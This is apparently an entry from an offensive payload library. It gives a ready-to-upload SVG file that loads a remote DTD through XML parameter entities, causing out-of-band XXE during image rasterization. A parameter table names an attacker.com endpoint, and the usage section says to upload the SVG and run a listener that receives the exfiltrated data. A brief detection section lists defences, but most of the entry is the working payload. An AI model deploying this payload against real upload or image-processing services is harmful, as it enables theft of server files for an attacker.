---
id: 3562aed7-3bd3-42d4-b1cc-ffb20effd52d
name: SVG-XXE-OOB-Exfiltration-via-Rasterization
type: code
language: xml
verified: true
created_at: '2023-04-06T03:56:44.558910+00:00'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Web
tags:
  - xxe
  - svg
  - oob
  - exfiltration
validated: true
---

# SVG-XXE-OOB-Exfiltration-via-Rasterization

## Code

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
<!ELEMENT svg ANY >
<!ENTITY % sp SYSTEM "http://example.org:8080/xxe.xml">
%sp;
%param1;
]>
<svg viewBox="0 0 200 200" version="1.2" xmlns="http://www.w3.org/2000/svg" style="fill:red">
      <text x="15" y="100" style="fill:black">XXE via SVG rasterization</text>
      <rect x="0" y="0" rx="10" ry="10" width="200" height="200" style="fill:pink;opacity:0.7"/>
      <flowRoot font-size="15">
         <flowRegion>
           <rect x="0" y="0" width="200" height="200" style="fill:red;opacity:0.3"/>
         </flowRegion>
         <flowDiv>
            <flowPara>&exfil;</flowPara>
         </flowDiv>
      </flowRoot>
</svg>
```

## Description

This payload uses parameter entities in the SVG DOCTYPE to load a remote DTD, enabling OOB XXE during rasterization to exfiltrate data via HTTP requests to an attacker server.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| http://example.org:8080/xxe.xml | Remote DTD endpoint | http://attacker.com/exfil.dtd |
| %param1; | Parameter for entity definition | Custom exfil entity |
| &exfil; | Entity reference triggering fetch | &data; |

## Usage

Include in SVG upload; set up a listener at the URL. Processing triggers fetch to your server, potentially including exfiltrated data in query params.

## Detection

- Network monitoring for outbound HTTP to unknown domains from XML parsers.
- WAF rules for parameter entity loads (%entity;).
- Disable DTD fetching in image libraries like ImageMagick.

## Related

- [[procedures/XXE-Injection-via-SVG-Image]]
